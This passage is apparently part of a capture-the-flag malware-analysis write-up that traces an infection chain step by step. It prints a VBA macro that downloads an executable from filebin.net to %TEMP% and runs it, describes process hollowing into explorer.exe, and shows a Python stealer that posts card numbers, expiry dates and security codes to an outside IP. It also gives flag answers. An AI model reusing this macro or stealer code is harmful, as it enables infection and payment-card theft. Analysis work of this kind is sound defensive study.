+</span></span><span class="line"><span class="cl">         <span class="n">plaintext_padded</span> <span class="o">=</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">)</span> <span class="o">+</span> <span class="n">decryptor</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="n">unpadder</span> <span class="o">=</span> <span class="n">padding</span><span class="o">.</span><span class="n">PKCS7</span><span class="p">(</span><span class="mi">128</span><span class="p">)</span><span class="o">.</span><span class="n">unpadder</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">         <span class="n">unpadded_data</span> <span class="o">=</span> <span class="n">unpadder</span><span class="o">.</span><span class="n">update</span><span class="p">(</span><span class="n">plaintext_padded</span><span class="p">)</span> <span class="o">+</span> <span class="n">unpadder</span><span class="o">.</span><span class="n">finalize</span><span class="p">()</span>
+</span></span><span class="line"><span class="cl">         <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;decryptrd&#39;</span><span class="p">,</span><span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">             <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">unpadded_data</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="n">unpadded_data</span>
+</span></span><span class="line"><span class="cl">     <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">         <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;Decryption failed: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">         <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">key</span><span class="o">=</span><span class="sa">b</span><span class="s1">&#39;^</span><span class="se">\xd1\xda</span><span class="s1">G</span><span class="se">\xe7\x1d</span><span class="s1">p</span><span class="se">\xf5\xf1\x80</span><span class="s1">Y</span><span class="se">\xfa\xdf\x12</span><span class="s1">!</span><span class="se">\x1c</span><span class="s1">k</span><span class="se">\xf8\x0b</span><span class="s1">V</span><span class="se">\xc4</span><span class="s1">jj</span><span class="se">\xfe\x97\xe0\xaf\xec\xe2\x98\x93</span><span class="s1">9&#39;</span>
+</span></span><span class="line"><span class="cl"> <span class="n">iv</span> <span class="o">=</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x9a\xff\r\xa1</span><span class="s1">ub=</span><span class="se">\x13\x96</span><span class="s1">n</span><span class="se">\xd8\x9d</span><span class="s1">y</span><span class="se">\xfa\x98\x00</span><span class="s1">&#39;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"> <span class="n">decrypt</span><span class="p">(</span><span class="s1">&#39;hahahah.dotm.enc&#39;</span><span class="p">,</span><span class="n">key</span><span class="p">,</span><span class="n">iv</span><span class="p">)</span>
+</span></span></code></pre></div><p>The KEY and IV is stored inside config.ini and saved in the downloads folder answering our second question.</p>
+<pre tabindex="0"><code>Answer Q2: AES-XTS_config.ini
+</code></pre><h3 class="group head-tag" id="question-3">Question 3<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-3"></a></h3><p>Q3) What is the file that initialsed the infection?</p>
+<p>Format: filename_md5(file)</p>
+<p>From the initial analysis we can confirm that hahahah.dotm started the infection. After decrypting it and extracting the macros from the dotm file</p>
+<pre tabindex="0"><code>Option Explicit
+
+Sub DownloadAndOpenFile()
+    Dim url As String
+    Dim destinationPath As String
+    Dim shell As Object
+    url = &#34;https://filebin.net/lfc6u585h3jmqfpp/7WAoNoZw&#34;
+    destinationPath = Environ(&#34;TEMP&#34;) &amp; &#34;\url.exe&#34; 
+    With CreateObject(&#34;MSXML2.ServerXMLHTTP&#34;)
+        .Open &#34;GET&#34;, url, False
+        .send
+        If .Status = 200 Then
+            Dim stream As Object
+            Set stream = CreateObject(&#34;ADODB.Stream&#34;)
+            stream.Open
+            stream.Type = 1
+            stream.Write .responseBody
+            stream.SaveToFile destinationPath, 2
+            stream.Close
+        End If
+    End With
+    Set shell = CreateObject(&#34;WScript.Shell&#34;)
+    shell.Run Chr(34) &amp; destinationPath &amp; Chr(34), 1, False
+End Sub
+</code></pre><p>We can see that this VBA macro downloads a file names it url.exe from the specified URL(
+<a
+  href="https://filebin.net/lfc6u585h3jmqfpp/7WAoNoZw"
+  
+    target="_blank"
+  
+  >https://filebin.net/lfc6u585h3jmqfpp/7WAoNoZw</a
+>
+) to the user&rsquo;s temp folder (%TEMP%) and then executes the downloaded file.</p>
+<pre tabindex="0"><code>Answer Q3: hahahah.dotm_b835a27ce7326b4715de910336d64233
+</code></pre><h3 class="group head-tag" id="question-4">Question 4<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-4"></a></h3><p>Q4) What is the file that further spreads the infection and what is it packed with?</p>
+<p>Format : filename_md5(file)_packer-name(all-lowercase)</p>
+<p>From the Macros we can see that the infection was further spread with the help of url.exe stored in the %TEMP% folder.</p>
+<p>On extracting the executable we can check which packer was used to pack the executable using 
+<a
+  href="https://www.unpac.me/#/"
+  
+    target="_blank"
+  
+  >UnpacME</a
+>
+ which tells you that it has been packed with VMprotect.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-1.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Answering the 4th Question</p>
+<pre tabindex="0"><code>Answer Q4:url.exe_8d0af7d7cbf539ae8e7543608d809e2c_vmprotect
+</code></pre><h3 class="group head-tag" id="question-5">Question 5<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-5"></a></h3><p>Q5) Given a string TH8r463H0D8O0C6enNPC, use the same algorithm of the above file that it used on the urls and give the hash?</p>
+<p>Format : md5(answer)</p>
+<p>As now we know that the file is packed with vmprotect, when analyzed , it didn&rsquo;t have any virtualization even at its entry point. so we can go by the usual method of unpacking it by using a debugger, preferably x64dbg and finding the OEP and dumping the unpacked binary by getting closer to OEP each time with a known syscall or API call.</p>
+<p>to dump the unpacked binary, we use VMPdump from 
+<a
+  href="https://github.com/0xnobody/vmpdump"
+  
+    target="_blank"
+  
+  >https://github.com/0xnobody/vmpdump</a
+>
+ and fixing up IAT and after this, we can analyze the unpacked binary.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we find the seed</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-2.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>as well we find the key generation subroutine</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-3.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we get to this after key generation</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-4.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>after looking into all three, the data transformation subroutine does some important operation, let&rsquo;s analyze it.</p>
+<p>and now we can go ahead and make a script to generate the required hash for the given string.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-5.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>Now we can use this script to generate the hash for the string</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iostream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;string&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;vector&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;windows.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;wininet.h&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;cstdio&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;cstring&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;iomanip&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp">#include</span> <span class="cpf">&lt;sstream&gt;</span><span class="cp">
+</span></span></span><span class="line"><span class="cl"><span class="cp"></span>
+</span></span><span class="line"><span class="cl"><span class="k">using</span> <span class="k">namespace</span> <span class="n">std</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="nf">stringToHex</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span><span class="o">&amp;</span> <span class="n">input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">ostringstream</span> <span class="n">hexStream</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">hexStream</span> <span class="o">&lt;&lt;</span> <span class="n">setfill</span><span class="p">(</span><span class="sc">&#39;0&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="kt">unsigned</span> <span class="kt">char</span> <span class="nl">c</span> <span class="p">:</span> <span class="n">input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">hexStream</span> <span class="o">&lt;&lt;</span> <span class="n">hex</span> <span class="o">&lt;&lt;</span> <span class="n">setw</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="o">&lt;&lt;</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span><span class="p">(</span><span class="n">c</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">hexStream</span><span class="p">.</span><span class="n">str</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="nf">hexToString</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span><span class="o">&amp;</span> <span class="n">input</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">input</span><span class="p">.</span><span class="n">length</span><span class="p">();</span> <span class="n">i</span> <span class="o">+=</span> <span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span> <span class="o">+=</span> <span class="k">static_cast</span><span class="o">&lt;</span><span class="kt">char</span><span class="o">&gt;</span><span class="p">(</span><span class="n">stoi</span><span class="p">(</span><span class="n">input</span><span class="p">.</span><span class="n">substr</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="mi">2</span><span class="p">),</span> <span class="k">nullptr</span><span class="p">,</span> <span class="mi">16</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">output</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">keyGen</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span><span class="o">&amp;</span> <span class="n">seed</span><span class="p">,</span> <span class="n">size_t</span> <span class="n">length</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;</span> <span class="n">sequence</span><span class="p">(</span><span class="n">length</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="kt">unsigned</span> <span class="kt">int</span> <span class="n">pseudoRandom</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">length</span><span class="p">;</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">pseudoRandom</span> <span class="o">=</span> <span class="p">(</span><span class="n">pseudoRandom</span> <span class="o">*</span> <span class="mi">33</span><span class="p">)</span> <span class="o">^</span> <span class="n">seed</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">seed</span><span class="p">.</span><span class="n">size</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl">        <span class="n">sequence</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">pseudoRandom</span> <span class="o">%</span> <span class="mi">256</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">sequence</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">string</span> <span class="nf">transformData</span><span class="p">(</span><span class="k">const</span> <span class="n">string</span><span class="o">&amp;</span> <span class="n">input</span><span class="p">,</span> <span class="k">const</span> <span class="n">vector</span><span class="o">&lt;</span><span class="kt">int</span><span class="o">&gt;&amp;</span> <span class="n">sequence</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">output</span> <span class="o">=</span> <span class="n">input</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="p">(</span><span class="n">size_t</span> <span class="n">i</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="n">i</span> <span class="o">&lt;</span> <span class="n">input</span><span class="p">.</span><span class="n">size</span><span class="p">();</span> <span class="o">++</span><span class="n">i</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="n">output</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">=</span> <span class="n">input</span><span class="p">[</span><span class="n">i</span><span class="p">]</span> <span class="o">^</span> <span class="n">sequence</span><span class="p">[</span><span class="n">i</span> <span class="o">%</span> <span class="n">sequence</span><span class="p">.</span><span class="n">size</span><span class="p">()];</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">stringToHex</span><span class="p">(</span><span class="n">output</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="kt">int</span> <span class="nf">main</span><span class="p">()</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">seed</span> <span class="o">=</span> <span class="s">&#34;greenlantern&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">str</span><span class="o">=</span><span class="s">&#34;TH8r463H0D8O0C6enNPC&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="k">auto</span> <span class="n">sequence</span> <span class="o">=</span> <span class="n">keyGen</span><span class="p">(</span><span class="n">seed</span><span class="p">,</span> <span class="n">str</span><span class="p">.</span><span class="n">length</span><span class="p">());</span>
+</span></span><span class="line"><span class="cl">    <span class="n">string</span> <span class="n">encryptedHex</span> <span class="o">=</span> <span class="n">transformData</span><span class="p">(</span><span class="n">str</span><span class="p">,</span> <span class="n">sequence</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="n">cout</span> <span class="o">&lt;&lt;</span> <span class="s">&#34;</span><span class="se">\n</span><span class="s">&#34;</span> <span class="o">&lt;&lt;</span> <span class="n">encryptedHex</span> <span class="o">&lt;&lt;</span> <span class="n">endl</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><pre tabindex="0"><code>Answer Q5) 337d88a72f21a5707ced833a42839345202c930e
+</code></pre><h3 class="group head-tag" id="question-6">Question 6<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-6"></a></h3><p>Q6) How is the further spreading done, give the technique, the file that does it and file that does further infection?</p>
+<p>Format : malware-technique(all-lowercase)_md5(file-that-does-it)_md5(file-that-does-further-infection)</p>
+<p>Investigating the executables which was downloaded by the previous executable we can see the executables which was installed in <strong>%TEMP%/AGjsTYC/</strong></p>
+<p>now let&rsquo;s analyze the 1st one with ida after few basic triaging and static analysis.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-6.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>looking into the string and xor operation done, we get</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-7.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>looking into this, we can resolve it while debugging easily.</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-8.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>so it resolves to explorer.exe</p>
+<p>now the both are passes as arguments to sub routine at 971000.</p>
+<p>looking into sub_971000, we can see it creates explorer.exe in suspended state, it calls NtUnmapViewOfSection to unmap the memory region at that base address from the process’s virtual memory, there is also PE relocation taken care of, then we see call to VirtualAllocEx to allocate enough virtual memory to write the malicious executable image, then there is call to WriteProcessMemory to write the malicious executable image into the base address, finally ResumeThread is called to resume the execution of the process.</p>
+<p>so basically it does <code>process hollowing</code></p>
+<p>so let&rsquo;s look into the other process executable that gets hollowed in explorer.exe</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-9.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>then it sends the link 
+<a
+  href="https://filebin.net/lfc6u585h3jmqfpp/WDjmIG5L"
+  
+    target="_blank"
+  
+  >https://filebin.net/lfc6u585h3jmqfpp/WDjmIG5L</a
+>
+ to a subroutine with temp path</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-10.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>here it get&rsquo;s downloaded.</p>
+<p>later on we can see ShellExecuteA is called to execute the downloaded executable.</p>
+<pre tabindex="0"><code>Answer Q6)process-hollowing_ec2db329630573f39f2c58a1a333aa27_affb09bbe2953abc425d1d3a37b3d82b
+</code></pre><h3 class="group head-tag" id="question-7">Question 7<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-7"></a></h3><p>Q7) What all files are dropped by the infector?</p>
+<p>Format : md5(files) seperated by underscores</p>
+<p>let&rsquo;s analyse the file <code>WDjmIG5L.exe</code> which was downloaded by the previous executable.</p>
+<pre tabindex="0"><code>int __fastcall main(int argc, const char **argv, const char **envp)
+{
+  _main(argc, argv, envp);
+  GetDir();
+  Downloader();
+  Launcher1();
+  return 0;
+}
+</code></pre><p>let&rsquo;s have a look into GetDir</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-11.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>The main use of this sub routine is to create 2 directories in local app data as well check for desktop.</p>
+<p>let&rsquo;s look into the next sub routine Downloader</p>
+
+  <figure class="data-image-info ">
+    <img
+      class="data-image"
+      src="image-12.png"
+      alt="alt text"
+      loading="lazy" />
+    <figcaption></figcaption>
+  </figure>
+
+<p>we can see it downloads 3 files in 3 different folders of the previous subroutine.</p>
+<p>now let&rsquo;s look into the next sub routine Launcher1</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-cpp" data-lang="cpp"><span class="line"><span class="cl"><span class="kt">char</span> <span class="nf">Launcher1</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="kt">char</span> <span class="n">result</span><span class="p">;</span> <span class="c1">// al
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>  <span class="n">SHELLEXECUTEINFOW</span> <span class="n">pExecInfo</span><span class="p">;</span> <span class="c1">// [rsp+20h] [rbp-70h] BYREF
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
+</span></span><span class="line"><span class="cl">  <span class="n">memset</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pExecInfo</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="k">sizeof</span><span class="p">(</span><span class="n">pExecInfo</span><span class="p">));</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">cbSize</span> <span class="o">=</span> <span class="mi">112</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">fMask</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">hwnd</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">lpVerb</span> <span class="o">=</span> <span class="p">(</span><span class="n">LPCWSTR</span><span class="p">)</span><span class="s">&#34;o&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">lpFile</span> <span class="o">=</span> <span class="o">&amp;</span><span class="n">downloadFile1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">lpParameters</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">lpDirectory</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">nShow</span> <span class="o">=</span> <span class="mi">5</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">pExecInfo</span><span class="p">.</span><span class="n">hInstApp</span> <span class="o">=</span> <span class="mi">0</span><span class="n">i64</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">  <span class="n">result</span> <span class="o">=</span> <span class="o">!</span><span class="n">ShellExecuteExW</span><span class="p">(</span><span class="o">&amp;</span><span class="n">pExecInfo</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">if</span> <span class="p">(</span> <span class="n">result</span> <span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text_109</span><span class="p">(</span><span class="sa">L</span><span class="s">&#34;Failed to launch</span><span class="se">\n</span><span class="s">&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">  <span class="k">return</span> <span class="n">result</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></div><p>and here it runs the bat script.</p>
+<pre tabindex="0"><code>Answer Q7) 33241f9fe44881e934c5e083389ebc1e_2a02fe4dc1364a7c071566d6c8774361_758abfe0632f8c45a46b6290328fc36b
+</code></pre><h3 class="group head-tag" id="question-8">Question 8<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-8"></a></h3><p>Q8)Where is the credit card information that gets stolen sent (isn&rsquo;t the cat cute?)?</p>
+<p>Format : ip:port</p>
+<p>There is a totallynotamalware.exe present in the Desktop folder which was dropped by <code>WDjmIG5L.exe</code>.<br>
+For this we can do a dynamic approach or reverse the binary. On doing <code>strings</code> on the file, we can find out that it is a <strong>python3.10</strong> binary.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">&gt;&gt;&gt; strings qRiZgNd7.exe <span class="p">|</span> grep -i python                       
+</span></span><span class="line"><span class="cl">Py_SetPythonHome
+</span></span><span class="line"><span class="cl">Failed to get address <span class="k">for</span> Py_SetPythonHome
+</span></span><span class="line"><span class="cl">Error loading Python DLL <span class="s1">&#39;%s&#39;</span>.
+</span></span><span class="line"><span class="cl">PYTHONUTF8
+</span></span><span class="line"><span class="cl">Invalid value <span class="k">for</span> <span class="nv">PYTHONUTF8</span><span class="o">=</span>%s<span class="p">;</span> disabling utf-8 mode!
+</span></span><span class="line"><span class="cl">Error detected starting Python VM.
+</span></span><span class="line"><span class="cl">bpython3.dll
+</span></span><span class="line"><span class="cl">bpython310.dll
+</span></span><span class="line"><span class="cl">6python310.dll
+</span></span></code></pre></div><p>Therefore we can follow the same steps we did in Qn.2 to get the source code of the binary. Getting the bytecode using <code>pyinstxtractor</code> and then using <code>pylingual</code> to get the source code.</p>
+<p>Analyzing the code, we can find that the function <code>details</code> is sending the stolen data to <code>https://192.22.14.4</code>. Therefore ip address is <code>192.22.14.4</code> and the port is <code>443</code>.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-py" data-lang="py"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">details</span><span class="p">(</span><span class="n">cn</span><span class="p">,</span> <span class="n">ed</span><span class="p">,</span> <span class="n">sc</span><span class="p">):</span>
+</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">cn</span><span class="o">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">ed</span><span class="o">.</span><span class="n">get</span><span class="p">(),</span> <span class="n">sc</span><span class="o">.</span><span class="n">get</span><span class="p">())</span>
+</span></span><span class="line"><span class="cl">    <span class="k">try</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;https://www.google.com&#39;</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="k">except</span> <span class="p">(</span><span class="n">requests</span><span class="o">.</span><span class="n">ConnectionError</span><span class="p">,</span> <span class="n">requests</span><span class="o">.</span><span class="n">Timeout</span><span class="p">)</span> <span class="k">as</span> <span class="n">exception</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="kc">None</span>
+</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">        <span class="n">post</span> <span class="o">=</span> <span class="p">{</span><span class="s1">&#39;credit_card_number&#39;</span><span class="p">:</span> <span class="n">cn</span><span class="o">.</span><span class="n">get</span><span class="p">(),</span> <span class="s1">&#39;expiry_date&#39;</span><span class="p">:</span> <span class="n">ed</span><span class="o">.</span><span class="n">get</span><span class="p">(),</span> <span class="s1">&#39;security_code&#39;</span><span class="p">:</span> <span class="n">sc</span><span class="o">.</span><span class="n">get</span><span class="p">()}</span>
+</span></span><span class="line"><span class="cl">        <span class="n">url</span> <span class="o">=</span> <span class="s1">&#39;https://192.22.14.4&#39;</span>
+</span></span><span class="line"><span class="cl">        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">json</span><span class="o">=</span><span class="n">post</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">response</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="s1">&#39;Thank you&#39;</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s1">&#39;Failed Status code: </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status_code</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">)</span>
+</span></span></code></pre></div><pre tabindex="0"><code>Answer Q8) 192.22.14.4:443
+</code></pre><h3 class="group head-tag" id="question-9">Question 9<a data-title-of-head class="group-hover:after:content-['__#'] no-underline hover:text-blue-700" href="#question-9"></a></h3><p>Q9) What is the file that had to set up persistence and what is the secret string that does through encryption?</p>
+<p>Format : filename_md5(file)_md5(decrypted-secret-string)</p>
